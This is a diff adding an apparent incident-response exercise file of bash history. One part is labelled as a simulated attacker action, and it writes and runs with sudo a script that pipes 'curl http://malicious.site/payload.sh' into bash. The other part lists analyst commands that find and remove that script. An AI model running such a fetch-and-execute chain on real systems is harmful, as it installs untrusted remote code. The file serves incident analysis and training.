@@ -1,0 +1,17 @@
+# Extracted bash history related to the incident
+
+# Simulated attacker action
+echo -e '#!/bin/bash\ncurl http://malicious.site/payload.sh | bash' | sudo tee /tmp/payload.sh > /dev/null
+sudo chmod +x /tmp/payload.sh
+sudo bash /tmp/payload.sh &
+
+# Analyst review commands
+ps aux | grep '[c]url'
+sudo find /tmp -name "*.sh"
+grep payload.sh ~/.bash_history
+history | grep payload
+crontab -l
+sudo grep -r "payload.sh" /etc/cron*
+sudo pkill curl
+sudo rm -f /tmp/payload.sh
+ls -l /tmp/payload.sh
